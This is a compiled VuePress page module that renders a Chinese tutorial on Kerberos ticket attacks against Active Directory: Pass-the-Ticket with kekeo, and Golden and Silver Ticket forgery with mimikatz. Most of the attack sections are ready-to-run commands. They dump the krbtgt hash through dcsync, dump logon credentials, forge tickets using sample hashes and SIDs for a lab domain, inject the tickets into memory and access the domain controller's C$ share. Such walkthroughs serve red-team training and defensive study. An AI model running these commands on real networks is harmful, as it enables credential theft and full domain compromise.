import{_ as s}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as n,c as r,a as e,b as a,d as l,e as d,r as t}from"./app.a5c8fdbc.js";const o={},c=e("h2",{id:"攻击步骤",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#攻击步骤","aria-hidden":"true"},"#"),a(" 攻击步骤")],-1),u=e("p",null,"票据传递（Pass the Ticket，PtT），使用 Kerberos票据，不需要管理员权限，攻击有效期是在票据有效期之内(一般为7天)。",-1),p=e("p",null,"在微软活动目录中颁发的TGT是可移植的，由于Kerberos的无状态特性，TGT中并没有关于票据来源的标识信息。",-1),v=e("p",null,"这意味着可以从某台计算机上导出一个有效的TGT，然后导入到该环境中其他的计算机上。",-1),m=e("p",null,"新导入的票据可以用于域的身份认证，并拥有票据中指定用户的权限来访问网络资源。",-1),h={href:"https://github.com/gentilkiwi/kekeo/releases",target:"_blank",rel:"noopener noreferrer"},b=d(`<p>1）在当前目录生成一个高权限票据文件</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>kekeo.exe <span class="token string">&quot;tgt::ask /user:Administrator /domain:hacker.org /ntlm:f3a0acba8bcfb8a0896281bbfcb793ed&quot;</span> <span class="token builtin class-name">exit</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>2）使用系统自带命令，清除内存中的票据</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>klist purge
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>3）将票据文件导入内存</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>kekeo <span class="token string">&quot;kerberos::ptt TGT_administrator@WINTRYSEC.LAB_krbtgt~wintrysec.lab@WINTRYSEC.LAB.kirbi&quot;</span> <span class="token builtin class-name">exit</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>4）列出远程主机的文件</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">dir</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span>DC<span class="token punctuation">\\</span>c$
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="黄金票据-golden-ticket" tabindex="-1"><a class="header-anchor" href="#黄金票据-golden-ticket" aria-hidden="true">#</a> 黄金票据（Golden Ticket）</h2><p>即伪造的TGT票据，当攻击者拥有了高权限的TGT，就可以发送给KDC的TGS 换取任意服务器的票据(ST)，有了金票就有了当前域内的最高控制权限。</p><details class="custom-container details"><summary>原理</summary><p>金票的<strong>利用原理</strong>是直接跳过了KDC的AS认证过程（AS-REQ、AS-REP通信）</p><p>由于黄金票据是伪造的TGT，它作为TGS-REQ的一部分被发送到KDC的TGS，以获取服务票据(ST)</p><p>伪造的黄金票据是 有效的TGT票据，因为它是由域账号<strong>krbtgt</strong>的<strong>NTLM Hash</strong>加密和签名的。</p><p>TGT用于向KDC的TGS服务证明Client已经过AS认证，TGT可以被该域内的任何KDC服务器解密。</p></details><h3 id="利用过程" tabindex="-1"><a class="header-anchor" href="#利用过程" aria-hidden="true">#</a> 利用过程</h3><p>1）导出krbtgt的NTLM Hash</p><div class="language-PowerShell line-numbers-mode" data-ext="PowerShell"><pre class="language-PowerShell"><code>#需要域管理员权限
mimikatz.exe &quot;lsadump::dcsync /user:krbtgt&quot; exit
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>2）获取域中所有用户的SID</p><p>应用的时候，去掉SID最后的数字</p><div class="language-PowerShell line-numbers-mode" data-ext="PowerShell"><pre class="language-PowerShell"><code> #只要是域用户权限就行
wmic useraccount get name,sid
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>3）制造黄金票据</p><div class="language-PowerShell line-numbers-mode" data-ext="PowerShell"><pre class="language-PowerShell"><code>#1) 清空现有票据
mimikatz.exe &quot;kerberos::purge&quot; exit

#2) 生成票据
 
mimikatz.exe &quot;kerberos::golden /admin:Administrator /domain:wintrysec.lab /sid:S-1-5-21-1160434164-3042164129-2463410311 /krbtgt:a8424e3f13e1253ea732a5245f2f4266 /ticket:Administrator.kiribi&quot; exit
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>4）将票据注入内存</p><div class="language-PowerShell line-numbers-mode" data-ext="PowerShell"><pre class="language-PowerShell"><code> mimikatz.exe &quot;kerberos::ptt Administrator.kiribi&quot; exit
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>5）检索当前会话中的票据</p><div class="language-PowerShell line-numbers-mode" data-ext="PowerShell"><pre class="language-PowerShell"><code> mimikatz.exe &quot;kerberos::tgt&quot; exit
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>6）权限验证</p><div class="language-PowerShell line-numbers-mode" data-ext="PowerShell"><pre class="language-PowerShell"><code> #列出域控的C盘
dir \\\\DC\\c$
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="白银票据" tabindex="-1"><a class="header-anchor" href="#白银票据" aria-hidden="true">#</a> 白银票据</h2><p>白银票据：即伪造的TGS票据，也称服务票据ST。</p><p>攻击者通过伪造合法的TGS，可以直接发送给Server，访问指定的某个服务。</p><p>当拥有Server(Service) Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket。</p><p>Server Session Key在未发送Ticket之前，服务器是不知道Server Session Key是什么的。</p><p>因此，银票的关键也在于Server的HTLM Hash</p><h3 id="利用步骤" tabindex="-1"><a class="header-anchor" href="#利用步骤" aria-hidden="true">#</a> 利用步骤</h3><p>1）获取目标服务器的NTLM Hash</p><div class="language-PowerShell line-numbers-mode" data-ext="PowerShell"><pre class="language-PowerShell"><code> mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>2）制造白银票据</p><div class="language-PowerShell line-numbers-mode" data-ext="PowerShell"><pre class="language-PowerShell"><code>#1）用系统命令清空当前系统票据
 klist purge
 
 #2）伪造票据
  
mimikatz.exe &quot;kerberos::golden /domain:wintrysec.lab /sid:S-1-5-21-1160434164-3042164129-2463410311 /target:DC.wintrysec.lab /service:CIFS /rc4:f0e889883425d83b0071e789507b3e6b /user:admin666 /ptt&quot; exit
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="黄金票据和白银票据的不同" tabindex="-1"><a class="header-anchor" href="#黄金票据和白银票据的不同" aria-hidden="true">#</a> 黄金票据和白银票据的不同</h2><p>访问权限不同：</p><p>​ • Golden Ticket：伪造TGT，可以获取任何Kerberos服务权限</p><p>​ • Silver Ticket：伪造TGS，只能访问指定的服务</p><p>加密方式不同：</p><p>​ • Golden Ticket由Kerberos的Hash加密</p><p>​ • Silver Ticket由服务账号（通常为计算机账户）Hash加密</p><p>认证流程不同：</p><p>​ • Golden Ticket的利用过程需要访问域控，</p><p>​ • Silver Ticket利用不需要访问域控</p>`,46);function g(k,S){const i=t("ExternalLinkIcon");return n(),r("div",null,[c,u,p,v,m,e("p",null,[a("工具kekeo："),e("a",h,[a("https://github.com/gentilkiwi/kekeo/releases "),l(i)])]),b])}const _=s(o,[["render",g],["__file","票据传递攻击.html.vue"]]);export{_ as default};
